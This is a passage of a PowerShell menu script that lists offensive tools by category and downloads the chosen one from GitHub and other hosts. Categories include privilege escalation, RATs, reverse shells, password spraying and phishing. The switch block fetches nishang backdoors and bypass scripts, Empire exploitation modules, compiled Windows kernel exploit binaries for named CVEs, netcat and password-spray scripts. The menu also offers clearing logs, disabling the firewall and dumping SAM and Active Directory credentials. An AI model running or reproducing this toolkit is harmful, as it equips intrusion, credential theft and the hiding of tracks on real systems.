    $TABELLA+=[pscustomobject]@{I=" 46. andrew-d/static-binaries/windows/x64"; II="126. HarmJ0y/Misc-PowerShell"; III="160. S3cur3Th1sSh1t/WinPwn"};
    $TABELLA+=[pscustomobject]@{I=" 193. NetSPI/MicroBurst/Misc"; II="208. S3cur3Th1sSh1t/WinPwn"; III="212. cyberark/SkyArk"};
    $TABELLA+=[pscustomobject]@{I=" 241. r00t-3xp10it/meterpeter"; II="243. InfosecMatter/Minimalistic-offensive-security-tools"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 248. k8gege/PowerLadon"; II="252. BankSecurity/Red_Team"; III="253. cutaway-security/chaps"};
    $TABELLA+=[pscustomobject]@{I=" 254. QAX-A-Team/CobaltStrike-Toolset"; II="256. Kevin-Robertson/Inveigh"; III="247. JoelGMSec/AutoRDPwn"};
    $TABELLA+=[pscustomobject]@{I=" 257. scipag/KleptoKitty"; II="261. homjxi0e/PowerAvails"; III="281. jaredhaight/PSAttackBuildTool/v1.9.1"};
    $TABELLA+=[pscustomobject]@{I=" 313. chocolatey/install"; II="352. rvrsh3ll/Misc-Powershell-Scripts"; III="354. Killeroo/PowerPing"};
    $TABELLA+=[pscustomobject]@{I=" 356. PowerShellMafia/PowerSploit"; II="357. fireeye/commando-vm"; III="487. ohpe/juicy-potato"};
    $TABELLA+=[pscustomobject]@{I=" 383. Invoke-IR/PowerForensics"; II="413. jaredhaight/PSAttack"; III="502. r3motecontrol/Ghostpack-CompiledBinaries/Seatbelt"};
    $TABELLA+=[pscustomobject]@{I=" 449. VikasSukhija/Downloads/Multi-Tools"; II="455. PowerShellEmpire/PowerTools"; III="471. S3cur3Th1sSh1t/PowerSharpPack"};
    $TABELLA+=[pscustomobject]@{I=" 474. TonyPhipps/Meerkat"; II="477. andrew-d/static-binaries/windows/x86"; III="478. andrew-d/static-binaries/windows/x64"};
    $TABELLA+=[pscustomobject]@{I=" 485. sysinternals.com/files/SysinternalsSuite"; II="486. sysinternals.com/files/SysinternalsSuite-ARM64"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 585. ivan-sincek/invoker"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "MITM";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 163. Kevin-Robertson/Inveigh"; II="272. odedshimon/BruteShark"; III="290. bettercap/bettercap"};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "OFFICE";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 595. connormcgarr/LittleCorporal"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "OSINT";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 255. ecstatic-nobel/pOSINT"; II="462. ElevenPaths/FOCA"; III="609. Viralmaniar/BigBountyRecon"};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "OWA";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 217. dafthack/MailSniper"; II="218. fugawi/EASSniper"; III="220. johnnyDEP/OWA-Toolkit"};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "PASSWORD";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 121. kfosaaen/Get-LAPSPasswords"; II="122. dafthack/DomainPasswordSpray"; III="123. NetSPI/PS_MultiCrack"};
    $TABELLA+=[pscustomobject]@{I=" 124. securethelogs/PSBruteZip"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "PAYLOAD";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 463. mdsecactivebreach/CACTUSTORCH.cna"; II="464. mdsecactivebreach/CACTUSTORCH.hta"; III="465. mdsecactivebreach/CACTUSTORCH.js"};
    $TABELLA+=[pscustomobject]@{I=" 466. mdsecactivebreach/CACTUSTORCH.jse"; II="467. mdsecactivebreach/CACTUSTORCH.vba"; III="468. mdsecactivebreach/CACTUSTORCH.vbe"};
    $TABELLA+=[pscustomobject]@{I=" 469. mdsecactivebreach/CACTUSTORCH.vbs"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "PHISHING";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 577. tokyoneon/CredPhish"; II=""; III=""};
    write-host $SEP;
    write-host "PIVOTING";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 265. attactics/Invoke-DCOMPowerPointPivot"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "POST-EXPLOITATION";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 374. BloodHoundAD/BloodHound"; II="377. gfoss/PSRecon"; III="593. iomoath/SharpStrike"};
    $TABELLA+=[pscustomobject]@{I=" 376. enigma0x3/Old-Powershell-payload-Excel-Delivery"; II="441. mubix/post-exploitation"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "PRIVESC - LATERAL MOVEMENT";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 10. offensive-security/exploitdb-windows_x86/local"; II="11. offensive-security/exploitdb-windows_x64/local"; III="12. samratashok/nishang/Escalation"};
    $TABELLA+=[pscustomobject]@{I=" 14. samratashok/nishang/Backdoors"; II="15. samratashok/nishang/Bypass"; III="18. samratashok/nishang/powerpreter"};
    $TABELLA+=[pscustomobject]@{I=" 29. itm4n/PrivescCheck"; II="60. PrintDemon PrivEsc"; III="368. offensive-security/exploitdb-windows/local"};
    $TABELLA+=[pscustomobject]@{I=" 112. HarmJ0y/Misc-PowerShell/Invoke-WdigestDowngrade"; II="127. PowerShellMafia/PowerSploit/Privesc/Get-System"; III="143. FuzzySecurity/PowerShell-Suite/Bypass-UAC"};
    $TABELLA+=[pscustomobject]@{I=" 151. Kevin-Robertson/Tater"; II="224. phackt/accesschk-XP"; III="225. sysinternals/accesschk"};
    $TABELLA+=[pscustomobject]@{I=" 278. ScorpionesLabs/DVS"; II="297. silentsignal/wpc-ps/WindowsPrivescCheck"; III="298. pentestmonkey/windows-privesc-check"};
    $TABELLA+=[pscustomobject]@{I=" 305. kmkz/PowerShell/ole-payload-generator"; II="324. sysinternals.com/AccessChk"; III="373. antonioCoco/RoguePotato"};
    $TABELLA+=[pscustomobject]@{I=" 440. xct/xc/PrivescCheck"; II="453. Mr-Un1k0d3r/SCShell"; III="480. abatchy17/WindowsExploits"};
    $TABELLA+=[pscustomobject]@{I=" 481. SecWiki/windows-kernel-exploits"; II="489. phackt/pentest/privesc/accesschk"; III="490 phackt/pentest/privesc/accesschk64"};
    $TABELLA+=[pscustomobject]@{I=" 495. phackt/pentest/privesc/windows/privesc"; II="542. Ascotbe/Kernelhub"; III="558. antonioCoco/RemotePotato0"};
    $TABELLA+=[pscustomobject]@{I=" 559. wdelmas/remote-potato"; II="566. S3cur3Th1sSh1t/NamedPipePTH/Invoke-ImpersonateUser-PTH"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 576. topotam/PetitPotam"; II="572. GossiTheDog/HiveNightmare"; III="596. jacob-baines/concealed_position"};
    $TABELLA+=[pscustomobject]@{I=" 599. codewhitesec/LethalHTA"; II="600. breenmachine/RottenPotatoNG"; III="492. phackt/pentest/privesc/windows/Set-LHSTokenPrivilege"};
    $TABELLA|Format-Table;
    write-host " 491. phackt/pentest/privesc/windows/Microsoft.ActiveDirectory.Management";
    write-host $SEP;
    write-host "PROXY - REVPROXY";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 404. fatedier/frp"; II="479. p3nt4/Invoke-SocksProxy"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "PXE";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 320. wavestone-cdt/powerpxe"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "RADIO";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 578. merbanan/rtl_433"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "RAT";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 213. FortyNorthSecurity/WMImplant"; II="275. quasar/Quasar.v1.4.0"; III="370. 3gstudent/Javascript-Backdoor (aka JSRat)"};
    $TABELLA+=[pscustomobject]@{I=" 372. BenChaliah/Arbitrium-RAT"; II="400. tokyoneon/Chimera/shells/misc/Invoke-PoshRatHttp"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 568. qwqdanchun/DcRat"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "RDP";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 146. 3gstudent/List-RDP-Connections-History"; II="286. Viralmaniar/Remote-Desktop-Caching"; III="288. technet.microsoft/scriptcenter/NLA"};
    $TABELLA+=[pscustomobject]@{I=" 567. BSI-Bund/RdpCacheStitcher"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "RECON";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 49. PowerShellMafia/PowerSploit/Recon"; II="167. xorrior/RemoteRecon"; III="603. nyxgeek/o365recon"};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "REG KEYS";
    $TABELLA=@();
    write-host " 319. microsoft/scriptcenter/GetRegistryKeyLastWriteTimeAndClassName";
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "REST";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 194. NetSPI/MicroBurst/REST"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "REVERSE ENGINEERING - DEBUGGING";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 40. mattifestation/PowerShellArsenal/Disassembly"; II="41. mattifestation/PowerShellArsenal/MemoryTools"; III="43. mattifestation/PowerShellArsenal/Parsers"};
    $TABELLA+=[pscustomobject]@{I=" 44. mattifestation/PowerShellArsenal/WindowsInternals"; II="228. 0xd4d/dnSpy"; III="229. ollydbg.de/odbg110"};
    $TABELLA+=[pscustomobject]@{I=" 230. rada.re/radare2-w32-2.2.0"; II="270. Decompile-Net-code"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "REVSHELL";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 238. 3v4Si0N/HTTP-revshell/Invoke-WebRev"; II="239. 3v4Si0N/HTTP-revshell/Revshell-Generator"; III="240. besimorhino/powercat"};
    $TABELLA+=[pscustomobject]@{I=" 242. danielwolfmann/Invoke-WordThief"; II="306. kmkz/PowerShell/Reverse-Shell"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 390. tokyoneon/Chimera/shells/Invoke-PowerShellTcp"; II="391. tokyoneon/Chimera/shells/Invoke-PowerShellTcpOneLine"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 393. tokyoneon/Chimera/shells/Invoke-PowerShellUdpOneLine"; II="394. tokyoneon/Chimera/shells/generic1"; III="395. tokyoneon/Chimera/shells/generic2"};
    $TABELLA+=[pscustomobject]@{I=" 396. tokyoneon/Chimera/shells/generic3"; II="397. tokyoneon/Chimera/shells/powershell_reverse_shell"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 388. tokyoneon/Chimera/shells/Invoke-PowerShellIcmp"; II="392. tokyoneon/Chimera/shells/Invoke-PowerShellUdp"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 493. phackt/pentest/privesc/windows/nc"; II="494. phackt/pentest/privesc/windows/nc64"; III="565. r00t-3xp10it/redpill"};
    $TABELLA+=[pscustomobject]@{I=" 582. DarkCoderSc/run-as-attached-networked/Win32"; II="583. DarkCoderSc/run-as-attached-networked/Win64"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 589. I2rys/NRSBackdoor"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "SCANNING";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 47. nmap.org tools"; II="17. samratashok/nishang/Scan"; III=""};
    write-host " 188. gallery.technet.microsoft.com/scriptcenter/Getting-Windows-Defender/Get-AntiMalwareStatus";
    $TABELLA+=[pscustomobject]@{I=" 401. tokyoneon/Chimera/shells/misc/Invoke-PortScan"; II="388. thom-s/netsec-ps-scripts/printer-telnet-ftp-report"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 475. k8gege/K8tools/K8PortScan"; II="591. BornToBeRoot/PowerShell_IPv4PortScanner"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "SMB";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 59. mvelazc0/Invoke-SMBLogin"; II="52. vletoux/smbscanner"; III="125. Kevin-Robertson/Invoke-TheHash"};
    $TABELLA+=[pscustomobject]@{I=" 55. InfosecMatter/Minimalistic-offensive-security-tools"; II="36. threatexpress/Invoke-PipeShell"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 133. ZecOps/CVE-2020-0796-RCE-POC/calc_target_offsets"; II="387. deepsecurity-pe/GoGhost"; III="448. arjansturing/smbv1finder"};
    $TABELLA+=[pscustomobject]@{I=" 447. Dviros/Excalibur"; II="461. ShawnDEvans/smbmap/psutils/Get-FileLockProcess"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "SNIFFER";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 53. sperner/PowerShell/Sniffer"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "SNMP";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 54. klemmestad/PowerShell/SNMP/MAXFocus_SNMP_Checks"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "SQL";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 148. NetSPI/PowerUpSQL"; II=""; III=""};
    write-host "206. nullbind/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner";
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "SSH";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 104. InfosecMatter/SSH-PuTTY-login-bruteforcer"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "TEXT EDITOR";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 314. zyedidia/micro"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "TUNNELING - FORWARDING";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 34. T3rry7f/ICMPTunnel/IcmpTunnel_C"; II="35. T3rry7f/ICMPTunnel/IcmpTunnel_C_64"; III="144. Kevin-Robertson/Inveigh/Inveigh-Relay"};
    $TABELLA+=[pscustomobject]@{I=" 169. deepzec/Win-PortFwd"; II="249. p3nt4/Invoke-SocksProxy"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "UTILITIES";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 90. Unzip file"; II="91. Ping sweep"; III="99. Download a File"};
    $TABELLA+=[pscustomobject]@{I=" 100. Share this Path"; II="101. Share this Path with Powershell"; III="102. Create PSCredentials"};
    $TABELLA+=[pscustomobject]@{I=" 103. Create PSSession with PSCredentials"; II="105. Decode base64 to file"; III="106. Run powershell with encoded command"};
    $TABELLA+=[pscustomobject]@{I=" 107. Invoke a block of commands"; II="108. Import one or All Modules"; III="110. Vbs technique"};
    $TABELLA+=[pscustomobject]@{I=" 111. dump wifi password"; II="113. show Security Packages"; III="114. dump SYSTEM and SAM values"};
    $TABELLA+=[pscustomobject]@{I=" 140. Ensure lockout threshold < AD lockout"; II="141. Set to >1 years"; III="142. Check Server Core"};
    $TABELLA+=[pscustomobject]@{I=" 149. Reset Sec. Descriptor Propagator proc. for 3 mins"; II="135. winrm attack with winrs"; III="175. Clear all logs"};
    $TABELLA+=[pscustomobject]@{I=" 185. Check Remote Registry is running (starts if did not)"; II="195. Disable firewall"; III="196. add an account to RDP groups"};
    $TABELLA+=[pscustomobject]@{I=" 198. AppLockerBypass with rundll32 and shell32"; II="199. AppLockerBypass with rundll32"; III="205. Print only printable chars"};
    $TABELLA+=[pscustomobject]@{I=" 214. Shred a file"; II="221. ActiveDirectory Enum"; III="561. tscon dictionary attack"};
    $TABELLA+=[pscustomobject]@{I=" 226. dump Active Directory creds with ndtsutil"; II="227. Analyze ADS in a file"; III="276. compute hash checksum of a file"};
    $TABELLA+=[pscustomobject]@{I=" 284. list all smb shares or a specific share name"; II="285. search words in files"; III="289. print my public ip method 1"};
    $TABELLA+=[pscustomobject]@{I=" 291. print my public ip method 2"; II="299. get target ip net infos"; III="300. get remote ip docker version"};
    $TABELLA+=[pscustomobject]@{I=" 301. get all remote users infos via finger"; II="321. import an xml file to dump credentials"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 322. simple TCP port scan"; II="323. check adminless mode enabled"; III="325. os and arch"};
    $TABELLA+=[pscustomobject]@{I=" 326. envi vars"; II="327. connected drives"; III="328. privileges"};
    $TABELLA+=[pscustomobject]@{I=" 329. other users"; II="330. list all groups"; III="331. list all admins"};
    $TABELLA+=[pscustomobject]@{I=" 332. user autologon"; II="333. dump from Cred man"; III="334. check access to SAM and SYSTEM files"};
    $TABELLA+=[pscustomobject]@{I=" 335. list all softwares installed"; II="336. use accesschk"; III="337. unquoted service path"};
    $TABELLA+=[pscustomobject]@{I=" 338. scheduled tasks"; II="339. autorun startup"; III="340. check AlwaysInstallElevated enabled"};
    $TABELLA+=[pscustomobject]@{I=" 341. snmp config"; II="342. password in registry"; III="343. sysprep or unattend files"};
    $TABELLA+=[pscustomobject]@{I=" 454. Active Directory infos"; II="459. Dump memory of a process"; III="460. Enable/Disable Evasion/Bypassing"};
    $TABELLA+=[pscustomobject]@{I=" 482. find password in *.xml *.ini *.txt"; II="483. find password in *.xml *.ini *.txt *.config"; III="484. find password in all files"};
    $TABELLA+=[pscustomobject]@{I=" 488. upnp info"; II="499. check bash exists"; III="513. list all open ports"};
    $TABELLA+=[pscustomobject]@{I=" 514. Hostname"; II="515. All Users informations"; III="516. permissions on /Users directories lax"};
    $TABELLA+=[pscustomobject]@{I=" 517. Password and storage information"; II="518. Search Password informations"; III="519. Audit setting"};
    $TABELLA+=[pscustomobject]@{I=" 520. WEF Setting"; II="521. LAPS installed"; III="522. UAC Enabled (0x1)?"};
    $TABELLA+=[pscustomobject]@{I=" 523. AV registered"; II="524. Cron Jobs"; III="525. Hosts"};
    $TABELLA+=[pscustomobject]@{I=" 526. Cache DNS"; II="527. Network and IP info"; III="528. ARP History"};
    $TABELLA+=[pscustomobject]@{I=" 529. Default route"; II="530. List all TCP connections"; III="531. List all UDP connections"};
    $TABELLA+=[pscustomobject]@{I=" 532. Show Firewall infos"; II="533. Running Services"; III="534. Services installed"};
    $TABELLA+=[pscustomobject]@{I=" 535. Softwares installed"; II="536. All WMIC infos"; III="537. DB passwords"};
    $TABELLA+=[pscustomobject]@{I=" 538. inetpub directory\wwwroot check"; II="579. Get all DNS infos from domain"; III="581. dump RDP credentials"};
    $TABELLA+=[pscustomobject]@{I=" 587. create tcp connectiont to send commands"; II="588. send an hex values buffer via socket STREAM TCP"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 610. Discover OS by ICMP TTL"; II="611. Try Manual SQLInjection"; III="612. WORDPRESS scan"};
    $TABELLA+=[pscustomobject]@{I=" 613. APACHE-TOMCAT scan"; II="614. DIRECTORIES scan"; III=""};
    $TABELLA|Format-Table;
    write-host " 215. Port forward all local addresses and all local ports to localhost and to specific local port v4 to v4";
    write-host " 222. Get Users about Service Principal Names (SPN) directory property for an Active Directory service account";
    write-host " 282. attack a Domain or IP with username and password wordlist files starting a remote powershell process";
    write-host " 283. attack an IP and Domain with username and password wordlist files entering in a remote powershell session";
    write-host $SEP;
    write-host "WEBAPP";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 350. Mr-Un1k0d3r/RedTeamCSharpScripts/webhunter"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "WEBDAV";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 269. p3nt4/Invoke-TmpDavFS"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "WEBSHELL";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 550. cert-lv/exchange_webshell_detection"; II="592. EatonChips/wsh"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "WINRM";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 158. davehardy20/Invoke-WinRMAttack"; II="408. antonioCoco/RogueWinRM"; III=""};
    write-host "159. d1pakda5/PowerShell-for-Pentesters/Code/44/Get-WinRMPassword";
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "WLAN - WIFI";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 402. tokyoneon/Chimera/shells/misc/Get-WLAN-Keys"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "WMI";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 262. Cybereason/Invoke-WMILM"; II="344. Mr-Un1k0d3r/RedTeamCSharpScripts/WMIUtility"; III="351. Mr-Un1k0d3r/RedTeamCSharpScripts/wmiutility"};
    $TABELLA+=[pscustomobject]@{I=" 507. r3motecontrol/Ghostpack-CompiledBinaries/SharpWMI"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "OTHERS - ?";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 399. tokyoneon/Chimera/shells/misc/Get-Information"; II="564. lawrenceamer/TChopper"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host " 0. exit`t"$EVT;
    write-host $SEP;

    $RISP=read-host 'Make your choice';
    switch ($RISP){
        '0' {exit}
        '1' {Scarica "HarmJ0y/PowerUp/PowerUp" "PowerUp.ps1" "HarmJ0y/PowerUp/master/PowerUp.ps1"}
        '2' {Scarica "absolomb/WindowsEnum" "WindowsEnum.ps1" "absolomb/WindowsEnum/master/WindowsEnum.ps1"}
        '3' {Scarica "rasta-mouse/Sherlock/Sherlock" "Sherlock.ps1" "rasta-mouse/Sherlock/master/Sherlock.ps1"}
        '4' {Scarica "enjoiz/Privesc/privesc" "privesc.ps1" "enjoiz/Privesc/master/privesc.ps1"}
        '5' {Scarica "411Hall/JAWS/jaws-enum" "jaws-enum.ps1" "411Hall/JAWS/master/jaws-enum.ps1"}
        '6' {ScaricaRel "carlospolop/PEASS-ng"}
        '7' {Scarica "hausec/ADAPE-Script/ADAPE" "ADAPE.ps1" "hausec/ADAPE-Script/master/ADAPE.ps1"}
        '8' {write-host "you will get https://github.com/frizb/Windows-Privilege-Escalation"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "frizb/Windows-Privilege-Escalation/$FILENAME" "$FILENAME" "frizb/Windows-Privilege-Escalation/master/$FILENAME"}}
        '9' {ScaricaBat "mattiareggiani/WinEnum" "WinEnum.bat" "mattiareggiani/WinEnum/master/WinEnum.bat"}
        '10' {write-host 'you will get https://github.com/offensive-security/exploitdb - windows_x86/local'; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "offensive-security/exploitdb/master/exploits/windows_x86/local/$FILENAME" "$FILENAME" "offensive-security/exploitdb/master/exploits/windows_x86/local/$FILENAME"}}
        '11' {write-host "you will get https://github.com/offensive-security/exploitdb - windows_x64/local"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "offensive-security/exploitdb/master/exploits/windows_x86-64/local/$FILENAME" "$FILENAME" "offensive-security/exploitdb/master/exploits/windows_x86-64/local/$FILENAME"}}
        '12' {write-host "you will get https://github.com/samratashok/nishang/tree/master/Escalation"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/Escalation/$FILENAME" "$FILENAME" "samratashok/nishang/master/Escalation/$FILENAME"}}
        '13' {write-host "you will get https://github.com/samratashok/nishang/tree/master/ActiveDirectory"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/ActiveDirectory/$FILENAME" "$FILENAME" "samratashok/nishang/master/ActiveDirectory/$FILENAME"}}
        '14' {write-host "you will get https://github.com/samratashok/nishang/tree/master/Backdoors"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/Backdoors/$FILENAME" "$FILENAME" "samratashok/nishang/master/Backdoors/$FILENAME"}}
        '15' {write-host "you will get https://github.com/samratashok/nishang/tree/master/Bypass"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/Bypass/$FILENAME" "$FILENAME" "samratashok/nishang/master/Bypass/$FILENAME"}}
        '16' {write-host "you will get https://github.com/samratashok/nishang/tree/master/Gather"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/Gather/$FILENAME" "$FILENAME" "samratashok/nishang/master/Gather/$FILENAME"}}
        '17' {write-host "you will get https://github.com/samratashok/nishang/tree/master/Scan"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/Scan/$FILENAME" "$FILENAME" "samratashok/nishang/master/Scan/$FILENAME"}}
        '18' {write-host "you will get https://github.com/samratashok/nishang/tree/master/powerpreter"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "samratashok/nishang/powerpreter/$FILENAME" "$FILENAME" "samratashok/nishang/master/powerpreter/$FILENAME"}}
        '19' {write-host "you will get https://github.com/FuzzySecurity/PowerShell-Suite"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "FuzzySecurity/PowerShell-Suite/$FILENAME" "$FILENAME" "FuzzySecurity/PowerShell-Suite/master/$FILENAME"}}
        '20' {ScaricaSSL "WindowsExploits/CVE-2012-0217/sysret" "sysret.exe" "WindowsExploits/Exploits/raw/master/CVE-2012-0217/Binaries/sysret.exe"}
        '21' {ScaricaSSL "WindowsExploits/CVE-2016-3309/bfill" "bfill.exe" "WindowsExploits/Exploits/raw/master/CVE-2016-3309/Binaries/bfill.exe"}
        '22' {ScaricaSSL "WindowsExploits/CVE-2016-3371/40429" "40429.exe" "WindowsExploits/Exploits/raw/master/CVE-2016-3371/Binaries/40429.exe"}
        '23' {Scarica "WindowsExploits/CVE-2016-7255/CVE-2016-7255" "CVE-2016-7255.ps1" "WindowsExploits/Exploits/master/CVE-2016-7255/CVE-2016-7255.ps1"}
        '24' {ScaricaSSL "WindowsExploits/CVE-2017-0213/CVE-2017-0213_x86" "CVE-2017-0213_x86.zip" "WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x86.zip"}
        '25' {ScaricaSSL "WindowsExploits/CVE-2017-0213/CVE-2017-0213_x64" "CVE-2017-0213_x64.zip" "WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip"}
        '26' {write-host "you will get https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "EmpireProject/Empire/privesc/$FILENAME" "$FILENAME" "EmpireProject/Empire/master/data/module_source/privesc/$FILENAME"}}
        '27' {write-host "you will get https://github.com/EmpireProject/Empire/tree/master/data/module_source/exploitation"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "EmpireProject/Empire/exploitation/$FILENAME" "$FILENAME" "EmpireProject/Empire/master/data/module_source/exploitation/$FILENAME"}}
        '28' {Scarica "hausec/PowerZure" "PowerZure.ps1" "hausec/PowerZure/master/PowerZure.ps1"}
        '29' {Scarica "itm4n/PrivescCheck" "Invoke-PrivescCheck.ps1" "itm4n/PrivescCheck/master/Invoke-PrivescCheck.ps1"}
        '30' {ScaricaExt "sysinternals/NotMyFault" "notmyfault.zip" "https://download.sysinternals.com/files/NotMyFault.zip"}
        '31' {ScaricaExt "sysinternals/Procdump" "procdump.zip" "https://download.sysinternals.com/files/Procdump.zip"}
        '32' {ScaricaExt "sysinternals/PSTools" "pstools.zip" "https://download.sysinternals.com/files/PSTools.zip"}
        '33' {ScaricaExt "eternallybored.org/netcat-win32-1.12" "netcat-win32-1.12.zip" "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"}
        '34' {ScaricaSSL "T3rry7f/ICMPTunnel/IcmpTunnel_C" "IcmpTunnel_C.exe" "T3rry7f/ICMPTunnel/raw/master/IcmpTunnel_C.exe"}
        '35' {ScaricaSSL "T3rry7f/ICMPTunnel/IcmpTunnel_C_64" "IcmpTunnel_C_64.exe" "T3rry7f/ICMPTunnel/raw/master/IcmpTunnel_C_64.exe"}
        '36' {Scarica "threatexpress/Invoke-PipeShell" "Invoke-PipeShell.ps1" "threatexpress/invoke-pipeshell/master/Invoke-PipeShell.ps1"}
        '37' {Scarica "mdavis332/DomainPasswordSpray/Invoke-DomainPasswordSpray" "Invoke-DomainPasswordSpray.ps1" "mdavis332/DomainPasswordSpray/master/public/Invoke-DomainPasswordSpray.ps1"}
        '38' {Scarica "mdavis332/DomainPasswordSpray/Get-DomainPasswordPolicy" "Get-DomainPasswordPolicy.ps1" "mdavis332/DomainPasswordSpray/master/private/Get-DomainPasswordPolicy.ps1"}
